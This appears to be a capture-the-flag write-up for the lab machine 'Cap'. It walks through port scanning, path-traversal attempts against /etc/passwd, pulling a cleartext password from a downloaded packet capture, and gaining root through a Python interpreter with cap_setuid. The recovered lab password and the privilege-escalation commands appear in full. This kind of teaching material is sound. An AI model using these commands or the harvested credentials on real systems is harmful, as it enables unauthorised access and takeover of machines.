# 1. Reconnaissance

The target machine was assigned the following IP address:

```text
10.129.58.191
```

My attacking machine had the following IP address:

```text
10.10.15.194
```

I started with the usual full TCP port scan:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -sV 10.129.58.191 -oG Allports
```

The scan revealed three open ports:

```text
21/tcp   FTP
22/tcp   SSH
80/tcp   HTTP
```

The complete output was:

# 2. Web Application Enumeration

When accessing the web application, I noticed that I was already logged in as:

```text

```

This was interesting because the application appeared to have functionality related to network information and packet captures.

Before focusing entirely on the web application, I also tested FTP.

I attempted to connect anonymously, but the server requested a password, so anonymous FTP access was not available.

Therefore, I continued with HTTP enumeration.

# 3. Testing for Local File Inclusion

One of the first things I tested was Local File Inclusion.

I attempted to access `/etc/passwd` using standard path traversal:

```text
../../../../../../etc/passwd
```

This did not return anything useful.

I then tried an alternative traversal representation:

```text
....//....//....//....//....//....//etc/passwd
```

Again, this did not produce a useful result.

This suggested that the functionality I was interacting with was probably not intended to provide arbitrary local file inclusion, so I moved on to understanding the application's functionality.

# 4. Discovering the Packet Capture Functionality

While navigating the application, I found functionality that executed commands related to network information, including commands such as:

```text
ipconfig
netstat
```

I attempted to manipulate the functionality by replacing the expected command-related input with something such as:

```text
whoami
```

However, this did not result in command execution.

While continuing to enumerate the application, I found a section related to scans.

The application appeared to perform network scans and generate downloadable results.

The interesting part was a parameter controlling the scan result.

I started manipulating this parameter and eventually changed its value to:

```text
0
```

I then downloaded the resulting file.

The downloaded file had a `.cap` extension, indicating that it was a packet capture file.

# 5. Analyzing the Packet Capture

Initially, I opened the `.cap` file with `nvim`, but this was not particularly useful because packet capture files are binary network data rather than normal text files.

Therefore, I opened the capture using Wireshark.

This allowed me to inspect the individual packets and reconstruct the traffic generated by the application.

While analyzing the capture, I noticed that it contained traffic generated when interacting with the web application.

More importantly, the capture contained authentication traffic.

Because the web application was using HTTP, the data was transmitted without encryption.

This meant that credentials sent through the application could potentially be recovered directly from the captured packets.

# 6. Recovering Nathan's Credentials

While inspecting the packets in Wireshark, I found authentication information belonging to the `nathan` user.

The password was transmitted in cleartext because the application was using HTTP.

The recovered password was:

```text
Buck3tH4TF0RM3!
```

This was the key to obtaining authenticated access to the machine.

The important lesson here is that packet captures can contain extremely sensitive information.

If authentication takes place over HTTP instead of HTTPS, credentials can appear directly inside captured network traffic.

The attack chain at this point was:

# 8. Privilege Escalation Enumeration

Now that I had access as `nathan`, I started enumerating possible privilege escalation vectors.

First, I checked sudo permissions:

```bash
sudo -l
```

The user did not have any useful sudo permissions.

I then checked my current groups and privileges with:

```bash
id
```

There was nothing immediately useful.

Next, I searched for SUID binaries:

```bash
find / -perm 4000 2>/dev/null
```

Again, nothing useful appeared.

Since neither sudo nor SUID provided an obvious path, I moved on to Linux capabilities.

# 9. Enumerating Linux Capabilities

Linux capabilities can grant specific privileged operations to executables without giving the executable the traditional SUID bit.

I searched the filesystem for binaries with capabilities:

```bash
getcap -r / 2>/dev/null
```

This time, I found something interesting:

```text
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

The important capability was:

```text
cap_setuid
```

`CAP_SETUID` allows a process to change its user ID.

Since Python had this capability, it meant that Python could potentially change its effective UID to `0`, which represents root.

I also checked the binary:

```bash
ls -l /usr/bin/python3.8
```

The binary belonged to `root`.

The combination of a root-owned Python interpreter and the `cap_setuid` capability provided a direct privilege escalation path.

# 10. Exploiting Python's cap_setuid Capability

I launched the affected Python interpreter:

```bash
/usr/bin/python3.8
```

This opened the Python interpreter:

```text
>>>
```

I imported Python's `os` module:

```python
>>> import os
```

Then I changed the process UID to `0`:

```python
>>> os.setuid(0)
```

I verified the current identity:

```python
>>> os.system("whoami")
root
0
```

The output confirmed that the Python process was now running as root.

Finally, I spawned a Bash shell:

```python
>>> os.system("/bin/bash")
```

I now had a root shell:

```text
root@cap:/home#
```

I verified it once again:

```bash
whoami
```

The result was:

```text
root
```

At this point, I had full root access to the system.

# Vulnerabilities & Techniques

## Packet Capture Disclosure

The web application allowed packet capture files to be generated and downloaded.

The resulting `.cap` file contained network traffic that could be inspected using Wireshark.

## Cleartext Credential Exposure

The application used HTTP for authentication traffic.

Because HTTP does not encrypt the contents of requests, credentials could be recovered directly from the packet capture.

Recovered credentials:

```text
nathan: Buck3tH4TF0RM3!
```

## Credential Reuse

The recovered password worked for SSH and FTP, allowing authenticated access to the system as `nathan`.

## Linux Capability Abuse

The most important privilege escalation vector was:

```text
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

The `cap_setuid` capability allowed Python to change its UID to `0`.

The following code was therefore sufficient to become root:

```python
import os
os.setuid(0)
os.system("/bin/bash")
```

## Privilege Escalation Through Python

Unlike a normal Python binary, this interpreter had a privileged capability assigned to it.

Since the process could set its UID to `0`, it could effectively become root without requiring `sudo` or SUID.

# Lessons Learned

The most important lesson from Cap was to not stop enumeration simply because the obvious privilege escalation techniques do not work.

Initially:

```text
sudo -l
```

provided nothing useful.

SUID enumeration also failed to reveal an obvious escalation path:

```bash
find / -perm 4000 2>/dev/null
```

The next logical step was checking Linux capabilities:

```bash
getcap -r / 2>/dev/null
```

This revealed the vulnerable Python installation.

The machine also demonstrated how dangerous unencrypted HTTP traffic can be. The packet capture contained authentication traffic, and because it was transmitted over HTTP, the password could be recovered directly.

The complete attack required chaining several enumeration techniques:

```text
Web Enumeration
Packet Capture Analysis
Wireshark
Cleartext Credential Extraction
Credential Reuse
SSH
Linux Capability Enumeration
cap_setuid Abuse
Python Privilege Escalation
```

Cap was a good demonstration of why enumeration should be systematic. When `sudo` and SUID do not provide a path, capabilities are another important place to look.
